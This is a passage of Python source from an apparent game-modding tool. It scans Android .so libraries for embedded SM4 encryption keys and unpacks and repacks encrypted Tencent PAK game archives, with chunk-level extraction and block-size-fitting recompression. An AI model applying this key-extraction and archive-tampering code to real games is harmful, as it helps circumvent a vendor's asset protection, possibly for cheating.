            view_sm4_saved_results()
        elif choice == "3":
            open_sm4_folders()
        elif choice == "0":
            break
        else:
            console.print(Panel(
                f'[bold red]❌ Option {choice} is invalid[/]',
                title='[bold red]Error[/]',
                border_style="red",
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')


def scan_so_files_with_progress():
    """Scan .so files with rich progress display"""
    console.print(Panel(
        '[bold cyan]🔍 SCANNING .so FILES FOR SM4 KEYS[/]',
        border_style='cyan',
        box=box.ROUNDED
    ))
    
    # Create folder structure
    base_folder = BASE_DIR / "SM4_FINDER"
    input_folder = base_folder / "input"
    output_folder = base_folder / "output"
    
    # Ensure folders exist
    input_folder.mkdir(parents=True, exist_ok=True)
    output_folder.mkdir(parents=True, exist_ok=True)
    
    # Get .so files
    so_files = list(input_folder.glob("**/*.so"))
    
    if not so_files:
        console.print(Panel(
            f'[bold red]❌ No .so files found![/bold red]\n\n'
            f'[cyan]💡 Please place your .so files in:[/cyan]\n'
            f'[white]{input_folder}[/white]',
            border_style="red"
        ))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return
    
    console.print(f'[green]✅ Found {len(so_files)} .so file(s)[/green]')
    
    all_secrets = defaultdict(set)
    
    # Progress bar for scanning
    with Progress(
        SpinnerColumn(spinner_name="dots12", style="bold cyan"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        TimeRemainingColumn(),
        console=console,
        expand=True
    ) as progress:
        task = progress.add_task("[cyan]Scanning .so files...", total=len(so_files))
        
        for so_file in so_files:
            progress.update(task, description=f"[cyan]Scanning: {so_file.name[:30]}...")
            
            try:
                results = scan_file_for_sm4(so_file)
                for k, v in results.items():
                    for secret in v:
                        all_secrets[k].add(secret)
            except Exception as e:
                console.print(f'[red]Error scanning {so_file.name}: {e}[/red]')
            
            progress.update(task, advance=1)
    
    # Show results
    display_sm4_results(all_secrets, so_files)


def scan_file_for_sm4(filepath):
    """Scan a single .so file for SM4 keys"""
    results = {'SM4_SECRET_4': [], 'SM4_SECRET_2': [], 'SM4_SECRET_NEW': []}
    
    try:
        content = filepath.read_bytes()
        total_len = len(content)
        target_len = 20
        
        for i in range(0, total_len - (target_len * 2), 2):
            chunk = content[i:i + target_len * 2]
            if all(b == 0 for b in chunk[1::2]) and all(32 <= b < 127 for b in chunk[0::2]):
                s = bytes(chunk[0::2]).decode('ascii', errors='ignore')
                if ' ' not in s:
                    if is_sm4_4_candidate(s):
                        results['SM4_SECRET_4'].append(s)
                    elif is_sm4_2_candidate(s):
                        results['SM4_SECRET_2'].append(s)
                    elif is_sm4_new_candidate(s):
                        results['SM4_SECRET_NEW'].append(s)
    except Exception as e:
        console.print(f'[red]Error: {e}[/red]')
    
    return results


def is_sm4_4_candidate(s):
    """Check if string matches SM4_SECRET_4 pattern"""
    if len(s) != 20:
        return False
    u = sum(1 for c in s if c.isupper())
    l = sum(1 for c in s if c.islower())
    d = sum(1 for c in s if c.isdigit())
    return d >= 10 and l >= 5 and u == 0 and all(c.isalnum() for c in s)


def is_sm4_2_candidate(s):
    """Check if string matches SM4_SECRET_2 pattern"""
    if len(s) != 20:
        return False
    u = sum(1 for c in s if c.isupper())
    l = sum(1 for c in s if c.islower())
    d = sum(1 for c in s if c.isdigit())
    s_char = sum(1 for c in s if c in '$*')
    return s_char >= 1 and u >= 5 and l >= 3 and d >= 1


def is_sm4_new_candidate(s):
    """Check if string matches SM4_SECRET_NEW pattern"""
    if len(s) != 20:
        return False
    for i in range(20):
        pos = i % 3
        if pos == 0 and not s[i].islower():
            return False
        elif pos == 1 and not s[i].isupper():
            return False
        elif pos == 2 and not s[i].isdigit():
            return False
    return True


def display_sm4_results(all_secrets, so_files):
    """Display SM4 scan results with rich formatting"""
    
    total_keys = sum(len(secrets) for secrets in all_secrets.values())
    
    if not any(all_secrets.values()):
        console.print(Panel(
            '[bold yellow]⚠ No SM4 keys found[/bold yellow]\n'
            '[dim]Try scanning different .so files[/dim]',
            border_style='yellow'
        ))
        return
    
    # Results table
    result_table = Table(
        title=f"[bold green]🔑 SM4 KEY SCAN RESULTS[/bold green]",
        box=box.ROUNDED,
        border_style="green",
        show_header=True,
        header_style="bold cyan"
    )
    result_table.add_column("Type", style="bold yellow", width=18)
    result_table.add_column("Keys Found", style="bold white", justify="center")
    result_table.add_column("Keys", style="cyan")
    
    key_types = [
        ('SM4_SECRET_4', '🔴 Type 4'),
        ('SM4_SECRET_2', '🟡 Type 2'), 
        ('SM4_SECRET_NEW', '🟢 Type New')
    ]
    
    for key_type, display_name in key_types:
        secrets = sorted(all_secrets[key_type])
        if secrets:
            key_display = '\n'.join([f'  • {s}' for s in secrets[:10]])
            if len(secrets) > 10:
                key_display += f'\n  ... and {len(secrets) - 10} more'
            result_table.add_row(display_name, str(len(secrets)), key_display)
    
    console.print(result_table)
    
    # Save results
    save_sm4_results(all_secrets, so_files)


def save_sm4_results(all_secrets, so_files):
    """Save SM4 scan results to output folder"""
    base_folder = BASE_DIR / "SM4_FINDER"
    output_folder = base_folder / "output"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Create output subdirectories
    (output_folder / "json").mkdir(parents=True, exist_ok=True)
    (output_folder / "txt").mkdir(parents=True, exist_ok=True)
    
    # Prepare data
    results_data = {
        "scan_info": {
            "scan_date": datetime.now().isoformat(),
            "input_files": [str(f) for f in so_files],
            "total_keys_found": sum(len(secrets) for secrets in all_secrets.values()),
            "total_files_scanned": len(so_files)
        },
        "keys": {
            key_type: list(secrets) 
            for key_type, secrets in all_secrets.items() 
            if secrets
        }
    }
    
    # Save JSON
    json_file = output_folder / "json" / f"scan_{timestamp}.json"
    with open(json_file, 'w') as f:
        json.dump(results_data, f, indent=4)
    
    # Save TXT
    txt_file = output_folder / "txt" / f"scan_{timestamp}.txt"
    with open(txt_file, 'w') as f:
        f.write("=" * 60 + "\n")
        f.write("TOXIC SM4 KEY SCAN RESULTS\n")
        f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Files Scanned: {len(so_files)}\n")
        f.write("=" * 60 + "\n\n")
        
        # List input files
        f.write("INPUT FILES:\n")
        f.write("-" * 40 + "\n")
        for i, file in enumerate(so_files, 1):
            f.write(f"  {i}. {file.name}\n")
        f.write("\n" + "=" * 60 + "\n\n")
        
        for key_type in ['SM4_SECRET_4', 'SM4_SECRET_2', 'SM4_SECRET_NEW']:
            secrets = sorted(all_secrets[key_type])
            if secrets:
                f.write(f"\n{key_type}:\n")
                f.write("-" * 40 + "\n")
                for s in secrets:
                    f.write(f"  '{s}'\n")
    
    console.print(Panel(
        f'[bold green]✅ Results saved![/bold green]\n\n'
        f'[cyan]📁 JSON:[/cyan] [white]{json_file}[/white]\n'
        f'[cyan]📄 TXT:[/cyan] [white]{txt_file}[/white]',
        border_style='green'
    ))


def view_sm4_saved_results():
    """View previously saved SM4 scan results"""
    base_folder = BASE_DIR / "SM4_FINDER"
    json_folder = base_folder / "output" / "json"
    
    if not json_folder.exists() or not list(json_folder.glob("*.json")):
        console.print(Panel(
            '[bold yellow]⚠ No saved results found![/bold yellow]\n'
            '[dim]Run a scan first to generate results[/dim]',
            border_style='yellow'
        ))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return
    
    json_files = sorted(json_folder.glob("*.json"), reverse=True)[:10]
    
    result_table = Table(
        title="[bold cyan]📂 SAVED SCAN RESULTS[/bold cyan]",
        box=box.ROUNDED,
        border_style="cyan",
        show_header=True,
        header_style="bold cyan"
    )
    result_table.add_column("#", style="bold yellow", width=4)
    result_table.add_column("File", style="white")
    result_table.add_column("Date", style="cyan")
    result_table.add_column("Keys Found", style="green", justify="center")
    result_table.add_column("Files Scanned", style="yellow", justify="center")
    
    for i, file in enumerate(json_files, 1):
        try:
            with open(file, 'r') as f:
                data = json.load(f)
                info = data.get('scan_info', {})
                date = info.get('scan_date', 'Unknown')[:19]
                total = info.get('total_keys_found', 0)
                files = info.get('total_files_scanned', 0)
                result_table.add_row(str(i), file.name, date, str(total), str(files))
        except:
            pass
    
    console.print(result_table)
    Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')


def open_sm4_folders():
    """Open SM4 input and output folders"""
    base_folder = BASE_DIR / "SM4_FINDER"
    input_folder = base_folder / "input"
    output_folder = base_folder / "output"
    
    # Ensure folders exist
    input_folder.mkdir(parents=True, exist_ok=True)
    output_folder.mkdir(parents=True, exist_ok=True)
    
    folder_table = Table(
        title="[bold cyan]📁 SM4 FOLDERS[/bold cyan]",
        box=box.ROUNDED,
        border_style="cyan"
    )
    folder_table.add_column("Folder", style="bold yellow")
    folder_table.add_column("Path", style="white")
    folder_table.add_row("📥 INPUT", str(input_folder))
    folder_table.add_row("📤 OUTPUT", str(output_folder))
    
    console.print(folder_table)
    
    # Try to open folders
    try:
        if os.path.exists('/data/data/com.termux'):
            # Termux environment
            subprocess.run(['termux-open', str(input_folder)])
            subprocess.run(['termux-open', str(output_folder)])
        elif sys.platform == 'linux':
            subprocess.run(['xdg-open', str(input_folder)])
            subprocess.run(['xdg-open', str(output_folder)])
        elif sys.platform == 'win32':
            subprocess.run(['start', str(input_folder)], shell=True)
            subprocess.run(['start', str(output_folder)], shell=True)
        else:
            console.print('[yellow]ℹ Folders created but cannot open automatically[/yellow]')
    except:
        pass
    
    Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')


# ==================== TRY FIT BLOCK HELPER ====================

def try_fit_block(plain_chunk: bytes, max_space: int, compression_method: int,
                   dict_data, file_path, encrypted: bool, encryption_method: int):
    """
    Try every available compression level to fit data into max_space.
    Returns (comp_data, aligned_len) or (None, -1) on failure.
    
    IMPROVED: For large blocks, also tries raw (uncompressed) storage if compression fails.
    """
    # Build the list of levels to attempt, starting from best compression
    if compression_method == const.CM_ZLIB:
        levels = list(range(9, -1, -1))           # 9 … 0
    elif compression_method in (const.CM_ZSTD, const.CM_ZSTD_DICT):
        # Positive levels first (highest), then fast/negative levels
        levels = list(range(22, 0, -1)) + list(range(-1, -23, -1))
    else:
        levels = [None]   # CM_NONE — no compression

    use_dict = dict_data if compression_method == const.CM_ZSTD_DICT else None

    for level in levels:
        try:
            if compression_method == const.CM_NONE:
                compressed = plain_chunk
            elif compression_method == const.CM_ZLIB:
                compressed = zlib.compress(plain_chunk, level)
            else:
                compressed = PakCompression.compress_block(
                    plain_chunk, use_dict, compression_method, level=level
                )

            candidate = compressed
            if encrypted:
                candidate = PakCrypto.encrypt_block(candidate, file_path, encryption_method)

            aligned = PakCrypto.align_encrypted_content_size(len(candidate), encryption_method)

            if aligned <= max_space:
                return candidate, aligned

        except Exception:
            continue   # bad level for this data — keep trying

    # ===== IMPROVEMENT: For large blocks, allow raw uncompressed storage =====
    # If all compression attempts failed and block is large, try storing uncompressed
    if len(plain_chunk) > 65536:  # > 64KB = large block
        try:
            candidate = plain_chunk  # No compression
            if encrypted:
                candidate = PakCrypto.encrypt_block(candidate, file_path, encryption_method)
            
            aligned = PakCrypto.align_encrypted_content_size(len(candidate), encryption_method)
            
            if aligned <= max_space:
                console.print(f"[cyan]    [i] Using uncompressed storage for large block[/i][/cyan]")
                return candidate, aligned
        except Exception:
            pass
    
    return None, -1


def try_fit_block_enhanced(plain_chunk: bytes, max_space: int, compression_method: int,
                           dict_data, file_path, encrypted: bool, encryption_method: int,
                           allow_overflow: bool = False):
    """
    Enhanced version with better large block support using best-fit strategy.
    
    allow_overflow: If True, allows small overflow (up to 512 bytes) for large blocks
    """
    if compression_method == const.CM_ZLIB:
        levels = list(range(9, -1, -1))
    elif compression_method in (const.CM_ZSTD, const.CM_ZSTD_DICT):
        levels = list(range(22, 0, -1)) + list(range(-1, -23, -1))
    else:
        levels = [None]

    use_dict = dict_data if compression_method == const.CM_ZSTD_DICT else None

    best_fit = None
    best_aligned = float('inf')

    for level in levels:
        try:
            if compression_method == const.CM_NONE:
                compressed = plain_chunk
            elif compression_method == const.CM_ZLIB:
                compressed = zlib.compress(plain_chunk, level)
            else:
                compressed = PakCompression.compress_block(
                    plain_chunk, use_dict, compression_method, level=level
                )

            candidate = compressed
            if encrypted:
                candidate = PakCrypto.encrypt_block(candidate, file_path, encryption_method)

            aligned = PakCrypto.align_encrypted_content_size(len(candidate), encryption_method)

            # Exact fit - return immediately
            if aligned <= max_space:
                return candidate, aligned
            
            # Track best fit for overflow handling
            if allow_overflow and aligned < best_aligned:
                best_fit = candidate
                best_aligned = aligned

        except Exception:
            continue

    # Return best fit if overflow is allowed and data fits within tolerance
    if allow_overflow and best_fit is not None and best_aligned <= max_space + 512:
        return best_fit, best_aligned

    return None, -1


# New Both Repack -----------------------------------------------------------------------------------

def normal_then_chunk_repack(folder_type: str, type_name: str):
    """
    SAFE PIPELINE (NO handle_repack MODIFICATION REQUIRED)

    1) Normal Repack (existing function)
    2) Pick output pak from REPACKED
    3) Chunk Repack on that pak
    4) Delete temp normal pak
    """

    console.print("[cyan]💛 Non Chunk + Chunk Repack [/cyan]")

    # ---------------- STEP 1 ----------------
    console.print("[yellow]🔁 Step 1: Non Chunk Repack[/yellow]")
    handle_repack(folder_type, type_name)

    repacked_dir = BASE_DIR / folder_type / "REPACKED"
    if not repacked_dir.exists():
        console.print("[red]❌ REPACKED folder not found[/red]")
        Prompt.ask("Press Enter...", default="")
        return

    # 🔍 get latest pak (normal repack output)
    repacked_paks = sorted(
        repacked_dir.glob("*.pak"),
        key=lambda p: p.stat().st_mtime,
        reverse=True
    )

    if not repacked_paks:
        console.print("[red]❌ No repacked PAK found[/red]")
        Prompt.ask("Press Enter...", default="")
        return

    normal_pak = repacked_paks[0]
    console.print(f"[green]✔ Normal Repack Output:[/] {normal_pak.name}")
    
    # ---------------- STEP 2 ----------------
    console.print("[yellow]🧩 Step 2: Chunk Repack[/yellow]")

    edited_dir = BASE_DIR / folder_type / "EDITED"
    if not edited_dir.exists() or not any(edited_dir.rglob("*")):
        console.print("[red]❌ EDITED folder empty[/red]")
        Prompt.ask("Press Enter...", default="")
        return

    final_pak = repacked_dir / normal_pak.name

    is_od_pack = folder_type == "OD_PAK"
    pak_instance = TencentPakFile(normal_pak, is_od=is_od_pack)

    report = RepackReport(pak_name=normal_pak.name, out_path=str(final_pak))

    chunk_repack_extracted(
        pak_instance,
        edited_dir,
        final_pak,
        report=report
    )

    report.print_report()

    Prompt.ask("[white]Press Enter to continue...[/white]", default="")


#Single File Unpack ------------------------------------------------------------------------------------

def unpack_file_blocks_using_filename(folder_type: str):

    console.print(
        f"[cyan]📦 Unpack File Using File Name[/cyan]\n"
        f"[white]Module:[/] {folder_type}"
    )

    # 🔹 select PAK
    pak_file = select_pak_file(folder_type, "Select PAK File")
    if not pak_file:
        return

    pak_file = Path(pak_file)
    pak_instance = TencentPakFile(pak_file)

    # 🔹 ask filename
    target_filename = Prompt.ask(
        "Enter exact file name (with extension)",
        console=console
    ).strip()

    if not target_filename:
        console.print("[red]❌ No filename entered[/red]")
        return

    # 🔹 ask mode
    console.print()
    console.print(Panel(
        Align.center(Text(" ⚙️  EXTRACTION MODE", style="bold white")),
        box=box.HEAVY_HEAD,
        border_style="yellow",
        padding=(0, 0),
        expand=False,
    ))
    _mt = Table(box=box.SIMPLE_HEAD, border_style="yellow",
                header_style="bold yellow", padding=(0, 0), expand=False, pad_edge=False)
    _mt.add_column("#", justify="center", width=4)
    _mt.add_column("MODE", style="bold white", width=26)
    _mt.add_row("1", "📄  NORMAL EXTRACT")
    _mt.add_row("2", "🧩  CHUNK EXTRACT")
    console.print(_mt)
    mode = Prompt.ask(
        "[bold yellow]  ▶ Choose mode[/bold yellow]",
        choices=["1", "2"],
        default="2",
        console=console,
    )

    # 🔹 ask path mode upfront (for BOTH normal and chunk extract)
    console.print()
    console.print(Panel(
        Align.center(Text("📂  OUTPUT PATH MODE", style="bold white")),
        box=box.HEAVY_HEAD,
        border_style="cyan",
        padding=(0, 0),
    ))
    _pt = Table(box=box.SIMPLE_HEAD, border_style="cyan",
                header_style="bold cyan", padding=(0, 1), expand=False)
    _pt.add_column("  #", style="bold yellow", justify="center", width=4)
    _pt.add_column("MODE", style="bold white", width=30)
    _pt.add_column("INFO", style="dim white")
    _pt.add_row("1", "📁  WITH PATH",    "Saves Folder Path")
    _pt.add_row("2", "📄  WITHOUT PATH", "Just file only")
    console.print(Align.center(_pt))
    path_mode = Prompt.ask(
        "[bold yellow]  ▶ Select path mode[/bold yellow]",
        choices=["1", "2"],
        default="1",
        console=console,
    )

    output_root = BASE_DIR / folder_type / "CHUNK_UNPACK"
    found = False

    for dir_path, files in pak_instance._index.items():
        entry = files.get(target_filename)
        if not entry:
            continue

        found = True

        file_base = Path(target_filename).stem
        file_ext  = Path(target_filename).suffix

        indices = PakCrypto.generate_block_indices(
            len(entry.compressed_blocks),
            entry.encryption_method
        )

        # ==================================================
        # 🔹 MODE 1: NORMAL EXTRACT (FULL FILE)
        # ==================================================
        if mode == "1":
            # With Path: preserve full PAK folder structure
            # Without Path: just file name at root of output_root
            if path_mode == "1" and dir_path:
                out_path = output_root / dir_path / target_filename
            else:
                out_path = output_root / target_filename
            out_path.parent.mkdir(parents=True, exist_ok=True)

            full_data = bytearray()

            with open(pak_file, "rb") as f_pak:
                for real_idx in indices:
                    block = entry.compressed_blocks[real_idx]
                    f_pak.seek(block.start)

                    raw_size = block.end - block.start

                    if entry.encrypted:
                        read_size = PakCrypto.align_encrypted_content_size(
                            raw_size,
                            entry.encryption_method
                        )
                    else:
                        read_size = raw_size

                    data = f_pak.read(read_size)

                    # decrypt
                    if entry.encrypted:
                        data = PakCrypto.decrypt_block(
                            data,
                            Path(target_filename),
                            entry.encryption_method
                        )

                    # decompress
                    if entry.compression_method != const.CM_NONE:
                        data = PakCompression.decompress_block(
                            data,
                            pak_instance._zstd_dict,
                            entry.compression_method
                        )

                    full_data.extend(data)

            out_path.write_bytes(full_data)

            pak_source_path = str(Path(dir_path) / target_filename) if dir_path else target_filename
            console.print()
            console.print(Panel(
                f"[bold green]✅ File Extracted[/bold green]\n"
                f"[bold white]📦 PAK Source:[/bold white]  [cyan]{pak_source_path}[/cyan]\n"
                f"[bold white]📁 Output:[/bold white]     [cyan]{out_path}[/cyan]",
                box=box.HEAVY_HEAD,
                border_style="green",
                padding=(0, 1),
            ))
            break

        # ==================================================
        # 🔹 MODE 2: CHUNK EXTRACT
        # ==================================================

        # Determine source path inside PAK
        pak_source_path = str(Path(dir_path) / target_filename) if dir_path else target_filename

        # Build output dir based on path_mode chosen earlier
        if path_mode == "1" and dir_path:
            out_dir = output_root / dir_path / file_base
        else:
            out_dir = output_root / file_base

        out_dir.mkdir(parents=True, exist_ok=True)

        console.print()
        console.print(Panel(
            f"[bold white]📦 PAK SOURCE[/bold white]  [cyan]{pak_source_path}[/cyan]\n"
            f"[bold white]📁 OUTPUT DIR[/bold white]  [cyan]{out_dir}[/cyan]",
            box=box.HEAVY_HEAD,
            border_style="yellow",
            padding=(0, 1),
        ))
        console.print()

        with open(pak_file, "rb") as f_pak:
            for i, real_idx in enumerate(indices):

                block = entry.compressed_blocks[real_idx]
                f_pak.seek(block.start)

                raw_size = block.end - block.start

                if entry.encrypted:
                    read_size = PakCrypto.align_encrypted_content_size(
                        raw_size,
                        entry.encryption_method
                    )
                else:
                    read_size = raw_size

                data = f_pak.read(read_size)

                if entry.encrypted:
                    data = PakCrypto.decrypt_block(
                        data,
                        Path(target_filename),
                        entry.encryption_method
                    )

                if entry.compression_method != const.CM_NONE:
                    data = PakCompression.decompress_block(
                        data,
                        pak_instance._zstd_dict,
                        entry.compression_method
                    )

                out_file = out_dir / f"{file_base}_{i}{file_ext}"
                out_file.write_bytes(data)

                console.print(f"  [green]✔[/green] [white]{out_file.name}[/white]  [dim]→ {out_file}[/dim]")

        console.print()
        console.print(Panel(
            f"[bold green]✅ Total Blocks Extracted:[/bold green] [yellow]{len(indices)}[/yellow]\n"
            f"[bold white]📦 PAK Source:[/bold white]  [cyan]{pak_source_path}[/cyan]\n"
            f"[bold white]📁 Output Dir:[/bold white]  [cyan]{out_dir}[/cyan]",
            box=box.HEAVY_HEAD,
            border_style="green",
            padding=(0, 1),
        ))
        break

    if not found:
        console.print(
            f"[red]❌ File not found in PAK:[/] {target_filename}"
        )

    Prompt.ask(
        "[yellow]Press Enter to continue...[/yellow]",
        console=console,
        default=""
    )


# ==================== MULTI-FILE CHUNK UNPACK ====================

def unpack_multiple_files_by_name(folder_type: str):
    """Unpack multiple files from a PAK by entering multiple filenames."""

    show_banner()

    console.print(Panel(
        Align.center(Text("MULTI CHUNK UNPACK", style="bold cyan")),
        box=box.SQUARE,
        border_style="cyan",
        padding=(0, 0),
    ))
    console.print()

    # ── Select PAK ────────────────────────────────────────────────
    pak_file = select_pak_file(folder_type, "SELECT PAK FILE")
    if not pak_file:
        return

    pak_file   = Path(pak_file)
    pak_instance = TencentPakFile(pak_file)

    # ── Select chunk mode ─────────────────────────────────────────
    console.print(Panel(
        Align.center(Text("EXTRACTION MODE", style="bold cyan")),
        box=box.SQUARE, border_style="yellow", padding=(0, 0),
    ))

    mode_table = Table(box=box.SQUARE, border_style="yellow", show_header=False,
                       padding=(0, 1), expand=False)
    mode_table.add_column("#", style="bold yellow", justify="center", width=4)
    mode_table.add_column("MODE", style="bold white", width=26)
    mode_table.add_column("──►", style="dim white", width=3)
    mode_table.add_column("INFO", style="bold cyan")
    mode_table.add_row("[1]", "NORMAL EXTRACT", "──►", "FULL FILE (REASSEMBLED)")
    mode_table.add_row("[2]", "CHUNK EXTRACT",  "──►", "INDIVIDUAL BLOCK FILES")
    console.print(Align.center(mode_table))
    console.print()

    mode = Prompt.ask(
        "  [bold cyan]──▶[/bold cyan]  CHOOSE MODE",
        choices=["1", "2"], default="2", console=console,
    )

    # ── Path mode ─────────────────────────────────────────────────
    console.print()
    console.print(Panel(
        Align.center(Text("OUTPUT PATH MODE", style="bold cyan")),
        box=box.SQUARE, border_style="cyan", padding=(0, 0),
    ))

    path_table = Table(box=box.SQUARE, border_style="cyan", show_header=False,
                       padding=(0, 1), expand=False)
    path_table.add_column("#", style="bold yellow", justify="center", width=4)
    path_table.add_column("MODE", style="bold white", width=26)
    path_table.add_column("──►", style="dim white", width=3)
    path_table.add_column("INFO", style="bold cyan")
    path_table.add_row("[1]", "WITH PATH",    "──►", "PRESERVES FOLDER STRUCTURE")
    path_table.add_row("[2]", "WITHOUT PATH", "──►", "FLAT — FILES ONLY AT ROOT")
    console.print(Align.center(path_table))
    console.print()

    path_mode = Prompt.ask(
        "  [bold cyan]──▶[/bold cyan]  SELECT PATH MODE",
        choices=["1", "2"], default="1", console=console,
    )

    # ── Enter filenames ───────────────────────────────────────────
    console.print()
    console.print(Panel(
        Align.center(Text(
            "ENTER FILE NAMES — ONE PER LINE\n"
            "TYPE 'DONE' ON A NEW LINE WHEN FINISHED",
            style="bold white",
        )),
        box=box.SQUARE, border_style="yellow", padding=(0, 1),
    ))
    console.print()

    filenames: list[str] = []
    while True:
        entry = Prompt.ask(
            f"  [bold yellow][{len(filenames)+1}][/bold yellow] FILENAME (or DONE)",
            console=console,
        ).strip()
        if entry.upper() == "DONE" or entry == "":
            break
        filenames.append(entry)

    if not filenames:
        console.print(Panel(
            Align.center(Text("  ✗  NO FILENAMES ENTERED  ", style="bold red")),
            box=box.SQUARE, border_style="red", padding=(0, 0),
        ))
        Prompt.ask("  Press Enter...", default="", console=console)
        return

    output_root = BASE_DIR / folder_type / "CHUNK_UNPACK"
    total_ok    = 0
    total_miss  = 0

    console.print()
    console.print(Panel(
        Align.center(Text(f"PROCESSING {len(filenames)} FILE(S)...", style="bold cyan")),
        box=box.SQUARE, border_style="cyan", padding=(0, 0),
    ))
    console.print()

    for target_filename in filenames:
        found = False

        for dir_path, files in pak_instance._index.items():
            entry = files.get(target_filename)
            if not entry:
                continue

            found     = True
            file_base = Path(target_filename).stem
            file_ext  = Path(target_filename).suffix
            indices   = PakCrypto.generate_block_indices(
                len(entry.compressed_blocks), entry.encryption_method
            )

            # ── Normal extract ────────────────────────────────────
            if mode == "1":
                if path_mode == "1" and dir_path:
                    out_path = output_root / dir_path / target_filename
                else:
                    out_path = output_root / target_filename
                out_path.parent.mkdir(parents=True, exist_ok=True)

                full_data = bytearray()
                with open(pak_file, "rb") as f_pak:
                    for real_idx in indices:
                        block    = entry.compressed_blocks[real_idx]
                        raw_size = block.end - block.start
                        f_pak.seek(block.start)
                        read_size = (
                            PakCrypto.align_encrypted_content_size(raw_size, entry.encryption_method)
                            if entry.encrypted else raw_size
                        )
                        data = f_pak.read(read_size)
                        if entry.encrypted:
                            data = PakCrypto.decrypt_block(data, Path(target_filename), entry.encryption_method)
                        if entry.compression_method != const.CM_NONE:
                            data = PakCompression.decompress_block(data, pak_instance._zstd_dict, entry.compression_method)
                        full_data.extend(data)
                out_path.write_bytes(full_data)
                console.print(f"  [bold green]✔[/bold green]  [white]{target_filename}[/white]  [dim cyan]──► {out_path}[/dim cyan]")

            # ── Chunk extract ─────────────────────────────────────
            else:
                if path_mode == "1" and dir_path:
                    out_dir = output_root / dir_path / file_base
                else:
                    out_dir = output_root / file_base
                out_dir.mkdir(parents=True, exist_ok=True)

                with open(pak_file, "rb") as f_pak:
                    for i, real_idx in enumerate(indices):
                        block    = entry.compressed_blocks[real_idx]
                        raw_size = block.end - block.start
                        f_pak.seek(block.start)
                        read_size = (
                            PakCrypto.align_encrypted_content_size(raw_size, entry.encryption_method)
                            if entry.encrypted else raw_size
                        )
                        data = f_pak.read(read_size)
                        if entry.encrypted:
                            data = PakCrypto.decrypt_block(data, Path(target_filename), entry.encryption_method)
                        if entry.compression_method != const.CM_NONE:
                            data = PakCompression.decompress_block(data, pak_instance._zstd_dict, entry.compression_method)
                        chunk_file = out_dir / f"{file_base}_{i}{file_ext}"
                        chunk_file.write_bytes(data)

                console.print(
                    f"  [bold green]✔[/bold green]  [white]{target_filename}[/white]  "
                    f"[yellow]{len(indices)} chunks[/yellow]  [dim cyan]──► {out_dir}[/dim cyan]"
                )

            total_ok += 1
            break

        if not found:
            console.print(f"  [bold red]✗[/bold red]  [white]{target_filename}[/white]  [dim red]NOT FOUND IN PAK[/dim red]")
            total_miss += 1

    # ── Summary ───────────────────────────────────────────────────
    console.print()
    summary_table = Table(box=box.SQUARE, border_style="green", show_header=False,
                          padding=(0, 1), expand=False)
    summary_table.add_column("FIELD", style="bold white", width=14)
    summary_table.add_column("VALUE", style="bold cyan")
    summary_table.add_row("REQUESTED", str(len(filenames)))
    summary_table.add_row("EXTRACTED", f"[bold green]{total_ok}[/bold green]")
    summary_table.add_row("NOT FOUND", f"[bold red]{total_miss}[/bold red]")
    summary_table.add_row("OUTPUT DIR", str(output_root))
    console.print(Panel(
        Align.center(summary_table),
        title="[bold green]MULTI UNPACK COMPLETE[/bold green]",
        box=box.SQUARE, border_style="green", padding=(0, 1),
    ))

    Prompt.ask(
        "  [bold yellow]──▶[/bold yellow]  PRESS ENTER TO CONTINUE",
        default="", console=console,
    )


# Chunk Repack Helper -------------------------------------------------------------------------------

def chunk_repack_extracted(pak_instance, edited_dir: Path, target_pak_path: Path,
                            report: "RepackReport | None" = None):

    console.print("[cyan]🧩 Chunk Repack (Per-Chunk Mode)[/cyan]")

    chunk_pattern = re.compile(r"^(?P<base>.+)_(?P<idx>\d+)(?P<ext>\.[^.]+)$")

    chunk_files = []
    for f in edited_dir.rglob("*"):
        if not f.is_file():
            continue
        m = chunk_pattern.match(f.name)
        if m:
            base_filename = m.group("base") + m.group("ext")
            chunk_index = int(m.group("idx"))
            chunk_files.append((f, base_filename, chunk_index))

    if not chunk_files:
        console.print("[yellow]⚠ No chunk files found in EDITED folder[/yellow]")
        return

    # Group chunks by base_filename for report tracking
    file_chunk_map: dict[str, list] = {}
    for src_file, base_filename, chunk_index in chunk_files:
        file_chunk_map.setdefault(base_filename, []).append((src_file, chunk_index))

    with open(target_pak_path, "r+b") as f_pak:

        for src_file, base_filename, chunk_index in chunk_files:

            found = False

            for dir_path, files in pak_instance._index.items():
                entry = files.get(base_filename)
                if not entry:
                    continue

                found = True
                total_blocks = len(entry.compressed_blocks)
                console.print(
                    f"[yellow]-> CHUNK REPACK:[/] {base_filename} | Block #{chunk_index}/{total_blocks-1}"
                )

                indices = PakCrypto.generate_block_indices(
                    total_blocks,
                    entry.encryption_method
                )

                if chunk_index >= len(indices):
                    console.print(
                        f"[red]❌ Invalid chunk index {chunk_index} "
                        f"(max {len(indices)-1})[/red]"
                    )
                    break

                real_idx = indices[chunk_index]
                block_meta = entry.compressed_blocks[real_idx]
                max_space = block_meta.end - block_meta.start

                plain_chunk = src_file.read_bytes()

                # 🔹 First attempt: default compression
                if entry.compression_method != const.CM_NONE:
                    comp_data = PakCompression.compress_block(
                        plain_chunk,
                        pak_instance._zstd_dict,
                        entry.compression_method
                    )
                else:
                    comp_data = plain_chunk

                if entry.encrypted:
                    comp_data = PakCrypto.encrypt_block(
                        comp_data,
                        Path(base_filename),
                        entry.encryption_method
                    )

                aligned_len = PakCrypto.align_encrypted_content_size(
                    len(comp_data),
                    entry.encryption_method
                )

                # 🔥 LARGE BLOCK FIX: If default compression overflows, try ALL levels
                if aligned_len > max_space:
                    console.print(
                        f"[yellow]  ⚙ Block overflow ({aligned_len} > {max_space}) — "
                        f"trying all compression levels...[/yellow]"
                    )
                    use_dict = (pak_instance._zstd_dict
                                if entry.compression_method == const.CM_ZSTD_DICT
                                else None)

                    fitted, fitted_aligned = try_fit_block(
                        plain_chunk, max_space,
                        entry.compression_method,
                        use_dict,
                        Path(base_filename),
                        entry.encrypted,
                        entry.encryption_method
                    )

                    if fitted is not None:
